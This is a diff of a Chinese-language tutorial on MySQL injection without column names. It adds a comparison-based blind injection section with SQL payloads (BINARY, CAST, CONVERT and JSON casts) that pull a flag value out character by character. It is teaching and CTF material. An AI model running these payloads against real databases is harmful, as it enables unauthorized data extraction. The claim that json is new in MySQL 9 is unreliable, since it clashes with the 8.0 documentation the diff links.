@@ -60,8 +60,8 @@ mysql> select `1` from (select 1,2,3 union select * from newtable)a;
 4 rows in set (0.00 sec)
 ```
 
-这一句话的意思是将select 1,2,3 union select * from newtable的内容取名为**表a**，然后再按照列名进行选择 (select \`1\` from a)
-这里还有一个点是为什么要用 **\`1\`** 而不是 **1**。因为此时的表a的列名为数字1，2，3，所以需要用**反引号**对其进行转义
+这一句话的意思是将select 1,2,3 union select * from newtable的内容取名为 **表a**，然后再按照列名进行选择 (select \`1\` from a)
+这里还有一个点是为什么要用 **\`1\`** 而不是 **1**。因为此时的表a的列名为数字1，2，3，所以需要用 **反引号** 对其进行转义
 
 那么当有了前面的基础后，我们就可以进行无列名的注入了
 
@@ -93,7 +93,87 @@ union select group_concat(a) from (select * from (select 1 `a`)m join (select 2 
 
 注意这里需要用group_concat将\`2\`包裹，因为这一个无列名的payload会返回多行数据，而我们这里只能返回一个数据，所以可以使用group_concat将多行数据都连接起来，那么最后返回的也就是被我命名为2的列的数据了
 
-#### JOIN报错注入
+### 比较注入
+
+在mysql中两个select查询的比较，是 **按位** 比较的，即先比第一位，如果相等则比第二位，以此类推
+
+在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这和c语言的strcmp()函数原理一样，举几个例子：
+
+* a < flag{xxx}
+* fla < flag{xxx}
+* g > flag{xxx}
+* flah > flag{xxx}
+
+在这样的按位比较过程中，因为在里层的for()循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c>b此时满足了，题目返回真，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以flag += chr(char-1)，这就是为什么在还原数据的时候要往前偏移一位的原因
+
+下面来看几个具体的比较
+
+表flag的数据
+``` sql
+mysql> select * from flag;
++----+-----------+
+| id | flag      |
++----+-----------+
+|  1 | flag{xxx} |
++----+-----------+
+1 row in set (0.00 sec)
+```
+这里使用 **\*** 代替列名进行注入
+``` sql
+mysql> select ((select 1,'a') > (select * from flag limit 1));
++-------------------------------------------------+
+| ((select 1,'a') > (select * from flag limit 1)) |
++-------------------------------------------------+
+|                                               0 |
++-------------------------------------------------+
+1 row in set (0.00 sec)
+```
+因为ascii(a)是小于ascii(f)的，所以返回0
+
+``` sql
+mysql> select ((select 1,'G') > (select * from flag limit 1));
++-------------------------------------------------+
+| ((select 1,'G') > (select * from flag limit 1)) |
++-------------------------------------------------+
+|                                               1 |
++-------------------------------------------------+
+1 row in set (0.00 sec)
+```
+但是在这个情况下，明明ascii(G)是小于ascii(f)，为什么会返回1呢
+
+这是因为 **mysql默认是不区分大小写的** ，所以说实际上比较的是ascii(g)与ascii(f)，当然前者大，返回1
+
+如果我们要比较ascii码的大小，那我们就需要使用**二进制字符串**进行比较
+
+具体来说，mysql可以使用三类函数进行类型的转换
+| Name | Description |
+| ------ | ------ |
+| BINARY | Cast a string to a binary string |
+| CAST() | Cast a value as a certain type |
+| CONVERT() | Cast a value as a certain type |
+
+所以我们只需要使用函数，进行转换类型即可实现比较 
+
+payload:
+``` sql
+## 使用binary
+select ((select 1,(binary 'G')) > (select * from flag limit 1));
+## 使用cast
+select ((select 1,cast('G' as binary)) > (select * from flag limit 1));
+## 使用convert
+select ((select 1,convert('G', binary)) > (select * from flag limit 1));
+```
+
+或者可以使用mysql9中新增的数据类型json，因为json的string类型是大小写敏感的
+
+![](./img/NoColumnInjection&BypassInformation_schema/1.png)
+
+payload:
+``` sql
+select ((select 1,concat('G', cast('0' as json))) > (select * from flag limit 1));
+```
+
+### JOIN报错注入
 
 在某些开发者配置不当的场景下，服务器会返回sql查询的错误信息
 这时我们就可以使用JOIN进行报错注入
@@ -221,3 +301,5 @@ SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGE
 * https://www.cnblogs.com/GH-D/p/11962522.html
 
 * https://www.cnblogs.com/20175211lyz/p/12358725.html
+
+* https://dev.mysql.com/doc/refman/8.0/en/json.html
